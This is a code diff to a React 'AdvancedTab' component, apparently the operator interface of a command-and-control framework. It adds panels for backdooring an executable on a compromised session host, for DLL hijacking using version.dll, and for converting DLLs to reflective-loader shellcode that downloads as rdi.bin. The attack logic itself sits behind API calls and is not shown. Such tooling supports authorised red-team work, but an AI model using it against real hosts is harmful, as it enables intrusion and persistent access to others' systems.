@@ -50,6 +50,28 @@ export default function AdvancedTab({ sessionId }: { sessionId: string }) {
   const [stageError, setStageError] = useState('')
   const [stageRunning, setStageRunning] = useState(false)
 
+  const [bdPath, setBdPath] = useState('')
+  const [bdProfile, setBdProfile] = useState('')
+  const [bdMsg, setBdMsg] = useState('')
+  const [bdError, setBdError] = useState('')
+  const [bdRunning, setBdRunning] = useState(false)
+
+  const [hjRefPath, setHjRefPath] = useState('')
+  const [hjTarget, setHjTarget] = useState('')
+  const [hjProfile, setHjProfile] = useState('')
+  const [hjRefFile, setHjRefFile] = useState<File | null>(null)
+  const [hjTargetFile, setHjTargetFile] = useState<File | null>(null)
+  const [hjMsg, setHjMsg] = useState('')
+  const [hjError, setHjError] = useState('')
+  const [hjRunning, setHjRunning] = useState(false)
+
+  const [rdiFile, setRdiFile] = useState<File | null>(null)
+  const [rdiFunction, setRdiFunction] = useState('')
+  const [rdiArgs, setRdiArgs] = useState('')
+  const [rdiShellcode, setRdiShellcode] = useState<{ DataB64: string; Size: number } | null>(null)
+  const [rdiError, setRdiError] = useState('')
+  const [rdiRunning, setRdiRunning] = useState(false)
+
   const reconfigure = async () => {
     const seconds = Number(reconSec)
     if (!Number.isFinite(seconds) || seconds <= 0) {
@@ -126,6 +148,76 @@ export default function AdvancedTab({ sessionId }: { sessionId: string }) {
     const a = document.createElement('a')
     a.href = url
     a.download = stager.FileName
+    a.click()
+    URL.revokeObjectURL(url)
+  }
+
+  const runBackdoor = async () => {
+    setBdRunning(true)
+    setBdError('')
+    setBdMsg('')
+    try {
+      await api.backdoor(sessionId, { file_path: bdPath.trim(), profile_name: bdProfile.trim() })
+      setBdMsg(t('advanced.backdoorOk'))
+    } catch (e) {
+      setBdError((e as Error).message)
+    } finally {
+      setBdRunning(false)
+    }
+  }
+
+  const runHijackDll = async () => {
+    setHjRunning(true)
+    setHjError('')
+    setHjMsg('')
+    try {
+      const refB64 = hjRefFile ? await toBase64(hjRefFile) : ''
+      const targetB64 = hjTargetFile ? await toBase64(hjTargetFile) : ''
+      await api.hijackDll(sessionId, {
+        reference_dll_path: hjRefPath.trim(),
+        target_location: hjTarget.trim(),
+        reference_dll_b64: refB64,
+        target_dll_b64: targetB64,
+        profile_name: hjProfile.trim(),
+      })
+      setHjMsg(t('advanced.hijackOk'))
+    } catch (e) {
+      setHjError((e as Error).message)
+    } finally {
+      setHjRunning(false)
+    }
+  }
+
+  const convertRdi = async () => {
+    if (!rdiFile) return
+    setRdiRunning(true)
+    setRdiError('')
+    setRdiShellcode(null)
+    try {
+      const b64 = await toBase64(rdiFile)
+      const res = await api.shellcodeRdi({
+        data_b64: b64,
+        function_name: rdiFunction.trim(),
+        arguments: rdiArgs,
+      })
+      setRdiShellcode(res)
+    } catch (e) {
+      setRdiError((e as Error).message)
+    } finally {
+      setRdiRunning(false)
+    }
+  }
+
+  const downloadRdi = () => {
+    if (!rdiShellcode) return
+    const data = atob(rdiShellcode.DataB64)
+    const bytes = new Uint8Array(data.length)
+    for (let i = 0; i < data.length; i++) bytes[i] = data.charCodeAt(i)
+    const blob = new Blob([bytes], { type: 'application/octet-stream' })
+    const url = URL.createObjectURL(blob)
+    const a = document.createElement('a')
+    a.href = url
+    a.download = 'rdi.bin'
     a.click()
     URL.revokeObjectURL(url)
   }
@@ -317,6 +409,101 @@ export default function AdvancedTab({ sessionId }: { sessionId: string }) {
             <span className="mono">{stager.Size} bytes</span>
             <button className="btn sm" onClick={downloadStage}>
               {t('advanced.stagerDownload')}
+            </button>
+          </div>
+        )}
+      </div>
+
+      <div className="card">
+        <div className="card-title">{t('advanced.backdoorTitle')}</div>
+        <div className="form-grid" style={{ marginBottom: 12 }}>
+          <div className="field" style={{ flex: 2 }}>
+            <label>{t('advanced.backdoorPath')}</label>
+            <input value={bdPath} onChange={(e) => setBdPath(e.target.value)} placeholder="C:\Windows\Temp\calc.exe" />
+          </div>
+          <div className="field">
+            <label>{t('advanced.backdoorProfile')}</label>
+            <input value={bdProfile} onChange={(e) => setBdProfile(e.target.value)} />
+          </div>
+          <div className="field" style={{ justifyContent: 'flex-end' }}>
+            <button className="btn primary" onClick={runBackdoor} disabled={bdRunning || !bdPath || !bdProfile}>
+              {bdRunning ? t('common.loading') : t('advanced.backdoorRun')}
+            </button>
+          </div>
+        </div>
+        {bdError && <div className="error-banner">{bdError}</div>}
+        {bdMsg && (
+          <div className="error-banner" style={{ borderColor: 'var(--green)', color: 'var(--green)', background: 'rgba(63,213,143,0.08)' }}>
+            {bdMsg}
+          </div>
+        )}
+      </div>
+
+      <div className="card">
+        <div className="card-title">{t('advanced.hijackTitle')}</div>
+        <div className="form-grid" style={{ marginBottom: 12 }}>
+          <div className="field" style={{ flex: 2 }}>
+            <label>{t('advanced.hijackRefPath')}</label>
+            <input value={hjRefPath} onChange={(e) => setHjRefPath(e.target.value)} placeholder="C:\Windows\System32\version.dll" />
+          </div>
+          <div className="field" style={{ flex: 2 }}>
+            <label>{t('advanced.hijackTarget')}</label>
+            <input value={hjTarget} onChange={(e) => setHjTarget(e.target.value)} placeholder="C:\Windows\Temp\version.dll" />
+          </div>
+          <div className="field">
+            <label>{t('advanced.hijackProfile')}</label>
+            <input value={hjProfile} onChange={(e) => setHjProfile(e.target.value)} />
+          </div>
+          <div className="field">
+            <label>{t('advanced.hijackRefDll')}</label>
+            <input type="file" onChange={(e) => setHjRefFile(e.target.files?.[0] || null)} />
+          </div>
+          <div className="field">
+            <label>{t('advanced.hijackTargetDll')}</label>
+            <input type="file" onChange={(e) => setHjTargetFile(e.target.files?.[0] || null)} />
+          </div>
+          <div className="field" style={{ justifyContent: 'flex-end' }}>
+            <button className="btn primary" onClick={runHijackDll} disabled={hjRunning || !hjTarget}>
+              {hjRunning ? t('common.loading') : t('advanced.hijackRun')}
+            </button>
+          </div>
+        </div>
+        {hjError && <div className="error-banner">{hjError}</div>}
+        {hjMsg && (
+          <div className="error-banner" style={{ borderColor: 'var(--green)', color: 'var(--green)', background: 'rgba(63,213,143,0.08)' }}>
+            {hjMsg}
+          </div>
+        )}
+      </div>
+
+      <div className="card">
+        <div className="card-title">{t('advanced.rdiTitle')}</div>
+        <div className="form-grid" style={{ marginBottom: 12 }}>
+          <div className="field">
+            <label>{t('advanced.rdiDll')}</label>
+            <input type="file" onChange={(e) => setRdiFile(e.target.files?.[0] || null)} />
+          </div>
+          <div className="field">
+            <label>{t('advanced.rdiFunction')}</label>
+            <input value={rdiFunction} onChange={(e) => setRdiFunction(e.target.value)} />
+          </div>
+          <div className="field" style={{ flex: 2 }}>
+            <label>{t('advanced.rdiArgs')}</label>
+            <input value={rdiArgs} onChange={(e) => setRdiArgs(e.target.value)} />
+          </div>
+          <div className="field" style={{ justifyContent: 'flex-end' }}>
+            <button className="btn primary" onClick={convertRdi} disabled={rdiRunning || !rdiFile}>
+              {rdiRunning ? t('common.loading') : t('advanced.rdiConvert')}
+            </button>
+          </div>
+        </div>
+        {rdiError && <div className="error-banner">{rdiError}</div>}
+        {rdiShellcode && (
+          <div className="toolbar">
+            <span className="mono">rdi.bin</span>
+            <span className="mono">{rdiShellcode.Size} bytes</span>
+            <button className="btn sm" onClick={downloadRdi}>
+              {t('advanced.rdiDownload')}
             </button>
           </div>
         )}
